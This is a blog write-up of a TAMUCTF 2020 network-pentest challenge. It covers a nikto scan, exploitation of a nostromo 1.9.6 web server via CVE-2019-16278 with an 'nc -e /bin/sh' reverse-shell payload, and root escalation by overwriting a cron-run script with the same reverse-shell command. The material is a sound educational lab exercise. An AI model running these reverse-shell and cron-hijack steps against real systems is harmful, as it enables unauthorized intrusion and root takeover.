---
layout: post
published: true
title: TAMUCTF-2020
date: '2020-03-30'
image: /img/tamuctf2020/1.png
---
Hey Guys , Back again with an interesting writeup.

<img src="/img/tamuctf2020/2.png" alt="2" style="zoom:%;" />

## MY_FIRST_BLOG

![3](/img/tamuctf2020/3.png)

A pentesting style chall from NETWORK_PENTEST category.

Given an ovpn config to connect to their internal network and a URL to start with.

http://172.30.0.2/



## Initial Foothold

![4](/img/tamuctf2020/4.png)

No juicy directories. Just a static page. So used `nikto` to get additional information about the webserver.

```console
╭─badboy17@badboy17-pc ~
╰─$ nikto -h http://172.30.0.2/        


- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          172.30.0.2
+ Target Hostname:    172.30.0.2
+ Target Port:        80
+ Start Time:         2020-03-29 12:07:58 (GMT5.5)
---------------------------------------------------------------------------
+ Server: nostromo 1.9.6
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
```

## Exploitation

`Server: nostromo 1.9.6` This banner is interesting. 

Searching for exploits we found one: 

#### CVE:

#### [2019-16278](https://nvd.nist.gov/vuln/detail/CVE-2019-16278)

Now there are two ways to get a shell. One through the Exploit and other through Metasploit.

I did it with the exploit.

```console
╭─badboy17@badboy17-pc ~
╰─$ python2 47837.py 172.30.0.2 80 'nc -e /bin/sh IP PORT'           




                                        _____-2019-16278
        _____  _______    ______   _____\    \   
   _____\    \_\      |  |      | /    / |    |  
  /     /|     ||     /  /     /|/    /  /___/|  
 /     / /____/||\    \  \    |/|    |__ |___|/  
|     | |____|/ \ \    \ |    | |       \        
|     |  _____   \|     \|    | |     __/ __     
|\     \|\    \   |\         /| |\    \  /  \    
| \_____\|    |   | \_______/ | | \____\/    |   
| |     /____/|    \ |     | /  | |    |____/|   
 \|_____|    ||     \|_____|/    \|____|   | |   
        |____|/                        |___|/    



```

```console
╭─badboy17@badboy17-pc ~
╰─$ nc -lvnp PORT                                                                                                                   
Connection from 172.30.0.2:45084
whoami
webserver

```

and we get in as `webserver`.

And as the `root` owns flag. Privilege escalation was needed.

## Privilege Escalation

No juicy files were in directories. So moving on to checking the system-wide `crontab`.

```console
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user	command
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
* * * * * root /usr/bin/healthcheck
```

Now here a `root` privileged script was cron'ed to run after every small interval.

`/usr/bin/healthcheck` .Checking the script

```bash
nc -z localhost 80
if [ $? == 1 ]; then
	echo "nhttpd is dead, restarting."
	nhttpd
fi
```

So the script was modified to get a `root` reverse shell.

```bash
echo "nc -e /bin/sh IP PORT" > /usr/bin/healthcheck
```

And we get a reverse shell. Wooohooooooooooooo.

```console
╭─badboy17@badboy17-pc ~ 
╰─$ nc -lvnp 12345
Connection from 172.30.0.2:48432
whoami
root
cat flag.txt
gigem{l1m17_y0ur_p3rm15510n5}
```

`gigem{l1m17_y0ur_p3rm15510n5}`

That's our pretty flag. 

Till next time xD.